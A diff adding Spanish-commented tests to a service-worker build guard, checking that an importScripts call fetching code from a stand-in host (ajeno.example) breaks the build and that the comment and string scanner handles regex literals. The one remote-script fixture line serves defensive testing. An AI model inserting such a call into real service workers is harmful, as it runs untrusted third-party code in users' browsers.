@@ -81,6 +81,37 @@ test("hablar de imports en un comentario o en una cadena no rompe el build", () 
   assert.doesNotThrow(() => generarServiceWorker(entradas({ fuente: soloProsa })));
 });
 
+/**
+ * `importScripts` es la que de verdad importa: es la única de las cuatro que **funciona** en un
+ * worker clásico, así que es la única capaz de meter código de un tercero en `/sw.js` sin romper
+ * nada y sin que se note. Las otras tres revientan en cuanto alguien abre la página; ésta no.
+ */
+test("importScripts() —la única que sí funcionaría en un worker clásico— rompe el build", () => {
+  assert.throws(
+    () =>
+      generarServiceWorker(
+        entradas({ fuente: `${FUENTE}\nimportScripts("https://ajeno.example/x.js");\n` }),
+      ),
+    /importScripts\(\)/u,
+  );
+});
+
+/**
+ * Y el escáner no puede perder el hilo con una expresión regular que lleve comillas dentro: entraba
+ * en modo cadena y a partir de ahí se tragaba el resto del fichero, o sea que el guardián dejaba de
+ * ver lo que viniera después. Fallar hacia el silencio es la única dirección que un guardián no
+ * puede permitirse.
+ */
+test("una expresión regular con comillas dentro no ciega al escáner", () => {
+  const limpio = soloCodigo(`const r = /['"]/u;\nawait import("./x.ts");`);
+  assert.match(limpio, /await import\(/u, "el import de después de la regex tiene que seguir viéndose");
+  assert.doesNotMatch(limpio, /\['"\]/u, "el contenido de la regex sí se tapa");
+});
+
+test("una división no se confunde con una expresión regular", () => {
+  assert.equal(soloCodigo("const a = 10 / 2; const b = a / 3;"), "const a = 10 / 2; const b = a / 3;");
+});
+
 test("el escáner vacía comentarios y cadenas y deja el código en su sitio", () => {
   assert.equal(soloCodigo('const a = 1; // import("x")').trim(), "const a = 1;");
   assert.match(soloCodigo('await import("./real.ts");'), /await import\(/u);
